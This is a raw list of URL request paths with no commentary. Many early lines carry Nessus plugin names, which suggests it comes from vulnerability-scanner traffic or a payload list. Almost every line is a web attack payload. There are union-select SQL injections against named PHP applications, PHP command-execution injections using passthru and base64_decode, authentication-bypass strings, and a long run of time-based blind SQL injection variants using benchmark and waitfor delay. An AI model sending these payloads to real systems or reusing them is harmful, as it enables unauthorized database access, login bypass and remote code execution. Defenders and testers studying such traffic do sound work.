 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331908854,0x3a,1781864537),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /manager/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332010414,1557267964 -- 
-
 /index.php?op=default&date=200607' union select 1,1310726682,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 760871658,2,576927904,4,5,6,7,8,9,0,1,2,3 --
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331904418',null,null,null,null --
-
 /index.php?id='union/**/select/**/0,0,1424469027,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1331919224,4--&blog=1
-
 /phpmyadmin/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,1486551460,0,0,0,0,0--
-
 /scripts/event_view.php?eid=34 union select 452593950
-
 /examples/jsp/num/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /phpmyadmin/documentation.html?phpmyadmin=map47fckapd3c2j9d7svslcjakhdm1fs'; waitfor delay '0:0:4' -- 
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,333020620,0,0,0,0,0--
-
 /phpmyadmin/faq.php?action=&type=view&s=&id=-1' union select 0,2100957477,0,0,0,0,0--
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332008334,1061714587 -- 
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,311692537,1573465944,1,1,1,1,1--&blogid=1
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331904243,1,1681261181--
-
 /scripts/index.php?id='union/**/select/**/0,0,250548738,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,1547116710,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?op=default&date=200607' union select 1,559960955,1,1,1,1,1,1,1,1--&blogid=1
-
 /recordings/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331918993',null,null,null,null --
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332010400,256728797 -- 
-
 /examples/jsp/error/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_jawtayfo]));die;/*
-
 /scripts/calendar.php?month=' union select 1,1,'1331908724','calendarix_month_sql_injection.nasl',1 #
-
 /examples/jsp/colors/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,1305074935,281030825,1,1,1,1,1--&blogid=1
-
 /www/delivery/ac.php?bannerid=-1331908694+or+1=1+--+';passthru(base64_decode($_server[http_nessus_xtwhhzn9]));die;/*
-
 /examples/jsp/checkbox/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331904452,227272765 --
-
 /phpmyadmin/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_oyo3tg_8]));die;/*
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,1668253961,0,0,0,0,0--
-
 /scripts/www/delivery/ac.php?bannerid=-5+or+1=1
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331904464,4,5
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,849156682645,4,5,6,7,8,9,10,11--
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 663157054,2,24321334,4,5,6,7,8,9,0,1,2,3 --
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331908881','5'--
-
 /scripts/index.php?id='union/**/select/**/0,0,1192005344,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /examples/jsp/error/index.php?id='union/**/select/**/0,0,410653569,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1332010411,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331904216',null,null,null,null --
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331908728,0x3a,1791311072),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /en-us/account/admin/index.php?act=login&username=' union select 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331909354,0x3a,1639211458),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331904439
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,44220770,0,0,0,0,0--
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 996551295,2,294567145,4,5,6,7,8,9,0,1,2,3 --
-
 /recordings/mail.php?id='/**/union/**/select/**/1,2,1331919012,4--&blog=1
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1332008334,1157745168 --
-
 /index.php?id='union/**/select/**/0,0,1926346269,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/admin/index.php?act=login&username=' union select 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,1187747366,616507462,1,1,1,1,1--&blogid=1
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331909312',null,null,null,null --
-
 /mail.php?id='/**/union/**/select/**/1,2,1331904244,4--&blog=1
-
 /examples/jsp/sessions/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_rvrxehcs]));die;/*
-
 /cacti/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /examples/jsp/cal/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /cacti/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331909312',null,null,null,null --
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331905213,113095511 -- 
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331909422,4,5
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,841172808568,4,5,6,7,8,9,10,11--
-
 /examples/jsp/jsp2/el/faq.php?action=&type=view&s=&id=-1' union select 0,1687881655,0,0,0,0,0--
-
 /examples/jsp/jsp2/jspx/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
-
 /examples/jsp/jsp2/jspx/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1331919012,4--&blog=1
-
 /examples/jsp/colors/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_ufeyvofb]));die;/*
-
 /scripts/index.php?op=default&date=200607' union select 1,204130911,1,1,1,1,1,1,1,1--&blogid=1
-
 /main.php?logout=1' and 1=1 and ''<>'zcztvbfx
-
 /en-us/account/?user=jffnms_user_sql_injection.nasl' union select 2,'admin','$1$rxs1rotx$iza1s3fccfyvfa9rwkbmi.','administrator'--&file=index&pass=
-
 /examples/jsp/colors/faq.php?action=&type=view&s=&id=-1' union select 0,421830018,0,0,0,0,0--
-
 /examples/jsp/jsp2/jspx/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /mail.php?id='/**/union/**/select/**/1,2,1332010406,4--&blog=1
-
 /examples/servlets/servlet/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /scripts/www/delivery/ac.php?bannerid=-1332009302+or+1=1+--+';passthru(base64_decode($_server[http_nessus_lh4qb_mt]));die;/*
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,230342059,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 500066955,2,800036118,4,5,6,7,8,9,0,1,2,3 --
-
 /en-us/account/www/delivery/ac.php?bannerid=-1331905039+or+1=1+--+';passthru(base64_decode($_server[http_nessus_o661njjc]));die;/*
-
 /examples/jsp/jsp2/el/index.php?op=default&date=200607' union select 1,727670276,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1331923205,4--&blog=1
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331904227,0x3a,1244506787),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /examples/jsp/jsp2/el/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /examples/jsp/colors/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /cacti/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331905123',null,null,null,null --
-
 /scripts/calendar.php?month=' union select 1,1,'1331918956','calendarix_month_sql_injection.nasl',1 #
-
 /examples/jsp/num/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331904442,1,1,1,1,1,1,1--&blogid=1
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331905123',null,null,null,null --
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 145671700--
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332010400','5'--
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,1290993919,0,0,0,0,0--
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,211288531,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 735838347--
-
 /scripts/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_kd0agct9]));die;/*
-
 /index.php?id='union/**/select/**/0,0,706027059,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,653954551,528677520,1,1,1,1,1--&blogid=1
-
 /scripts/www/delivery/ac.php?bannerid=-1331905039+or+1=1+--+';passthru(base64_decode($_server[http_nessus_lcnlbbuk]));die;/*
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,181555201,0,0,0,0,0--
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,1968195068,0,0,0,0,0--
-
 /recordings/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /mail.php?id='/**/union/**/select/**/1,2,1331908741,4--&blog=1
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1420911431--
-
 /scripts/event_view.php?eid=34 union select 610245698
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331909400,244455451 -- 
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331905213,113095511 -- 
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,1764635809,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/sessions/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /examples/jsp/jsp2/jspx/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,1978396456,0,0,0,0,0--
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1332010414,607312942 --
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,1340614335,0,0,0,0,0--
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332009307','5'--
-
 /manager/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /examples/jsp/checkbox/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /examples/servlets/servlet/index.php?id='union/**/select/**/0,0,1738276559,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331909407','5'--
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331908874,150489293 --
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,416276020,64888377,1,1,1,1,1--&blogid=1
-
 /cacti/?user=jffnms_user_sql_injection.nasl' union select 2,'admin','$1$rxs1rotx$iza1s3fccfyvfa9rwkbmi.','administrator'--&file=index&pass=
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331923203,1746193209 --
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1331905235,4--&blog=1
-
 /modules.php?op=modload&name=news&file=index&catid="1" and force_error=error
-
 /examples/jsp/error/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /en-us/account/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331905219','5'--
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,709400366843,4,5,6,7,8,9,10,11--
-
 /examples/jsp/checkbox/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,179101196039,4,5,6,7,8,9,10,11--
-
 /examples/jsp/cal/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /scripts/event_view.php?eid=34 union select 1948700004
-
 /examples/jsp/colors/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331919146+or+1=1+--+';passthru(base64_decode($_server[http_nessus_nwqzfywo]));die;/*
-
 /path0/path1/path2/?payload=' or 2=2
-
 /path0/path1/?payload=" or 202
-
 /?payload=' or '1'='1
-
 /path0/?payload=' or ''='
-
 /?payload=x' or 1=1 or 'x'='y
-
 /path0/?payload=x' or name()='username' or 'x'='y
-
 /path0/path1/?payload=' and count(/*)=1 and '1'='1
-
 /path0/?payload=' and count(/@*)=1 and '1'='1
-
 /path0/path1/path2/path3/?payload=' and count(/comment())=1 and '1'='1
-
 /path0/path1/path2/path3/?payload=and 0=benchmark(3000000,MD5(1))%20/*
-
 /?payload= and 0=benchmark(3000000,MD5(1))%20--
-
 /?payload= and 0=benchmark(3000000,MD5(1))%20%23
-
 /?payload=' and 0=benchmark(3000000,MD5(1))%20/*
-
 /path0/?payload=' and 0=benchmark(3000000,MD5(1))%20--
-
 /path0/?payload=' and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/path1/?payload=" and 0=benchmark(3000000,MD5(1))%20/*
-
 /path0/path1/path2/path3/?payload=" and 0=benchmark(3000000,MD5(1))%20--
-
 /path0/?payload=" and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/path1/path2/path3/?payload=) and 0=benchmark(3000000,MD5(1))%20/*
-
 /?payload=) and 0=benchmark(3000000,MD5(1))%20--
-
 /path0/path1/path2/?payload=) and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/path1/?payload=)) and 0=benchmark(3000000,MD5(1))%20/*
-
 /path0/path1/path2/?payload=)) and 0=benchmark(3000000,MD5(1))%20--
-
 /path0/path1/path2/?payload=)) and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/path1/path2/?payload=))) and 0=benchmark(3000000,MD5(1))%20/*
-
 /path0/path1/path2/?payload=))) and 0=benchmark(3000000,MD5(1))%20--
-
 /?payload=))) and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/path1/?payload=)))) and 0=benchmark(3000000,MD5(1))%20/*
-
 /path0/path1/path2/path3/?payload=)))) and 0=benchmark(3000000,MD5(1))%20--
-
 /path0/?payload=)))) and 0=benchmark(3000000,MD5(1))%20%23
-
 /?payload=') and 0=benchmark(3000000,MD5(1))%20/*
-
 /path0/?payload=') and 0=benchmark(3000000,MD5(1))%20--
-
 /path0/path1/path2/?payload=') and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/path1/?payload=") and 0=benchmark(3000000,MD5(1))%20/*
-
 /path0/?payload=") and 0=benchmark(3000000,MD5(1))%20--
-
 /path0/?payload=") and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/path1/?payload=')) and 0=benchmark(3000000,MD5(1))%20/*
-
 /?payload=')) and 0=benchmark(3000000,MD5(1))%20--
-
 /path0/path1/path2/?payload=')) and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/path1/path2/?payload=")) and 0=benchmark(3000000,MD5(1))%20/*
-
 /?payload=")) and 0=benchmark(3000000,MD5(1))%20--
-
 /?payload=")) and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/?payload='))) and 0=benchmark(3000000,MD5(1))%20/*
-
 /path0/?payload='))) and 0=benchmark(3000000,MD5(1))%20--
-
 /path0/path1/path2/?payload='))) and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/path1/?payload="))) and 0=benchmark(3000000,MD5(1))%20/*
-
 /?payload="))) and 0=benchmark(3000000,MD5(1))%20--
-
 /path0/?payload="))) and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/path1/path2/?payload=')))) and 0=benchmark(3000000,MD5(1))%20/*
-
 /path0/?payload=')))) and 0=benchmark(3000000,MD5(1))%20--
-
 /?payload=')))) and 0=benchmark(3000000,MD5(1))%20%23
-
 /path0/path1/path2/path3/?payload=")))) and 0=benchmark(3000000,MD5(1))%20/*
-
 /path0/path1/?payload=")))) and 0=benchmark(3000000,MD5(1))%20--
-
 /?payload=")))) and 0=benchmark(3000000,MD5(1))%20%23
-
 /?payload=)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/?payload=)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/?payload=')%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload=')%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload=")%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload=")%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload=))%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/?payload=))%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload='))%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload='))%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload="))%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/path3/?payload="))%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload=,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload=,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /?payload=',NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload=",NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload=",NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload=),NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/?payload=),NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload='),NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload="),NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload="),NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload=,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload=,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/?payload=',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/path3/?payload=',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload=",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/?payload=",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload=),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/?payload=),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload='),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload='),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/path3/?payload="),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/?payload="),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /?payload=,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/path3/?payload=,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload=',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/?payload=',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /?payload=",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload=",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/?payload=),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload=),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload='),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/path3/?payload='),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/?payload="),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/?payload="),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/path3/?payload=,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/path3/?payload=,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload=',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload=',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload=",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload=",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/?payload=),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/?payload=),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload='),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload='),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /?payload="),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload="),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /?payload=,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload=,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/?payload=',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/?payload=',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /?payload=",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload=",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload=),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload=),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /?payload='),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload='),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/path3/?payload="),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload="),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/path3/?payload=,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload=',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload=',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/?payload=",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/?payload=",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/path3/?payload=),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/path3/?payload=),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload='),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload='),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/?payload="),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload="),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload=,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload=,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /?payload=',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload=',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload=",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/?payload=",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /?payload=),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload=),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /?payload='),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload='),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/?payload="),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/path2/?payload="),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/?payload=,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /?payload=,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
 /path0/path1/path2/?payload=',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
-
 /path0/path1/?payload=',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
-
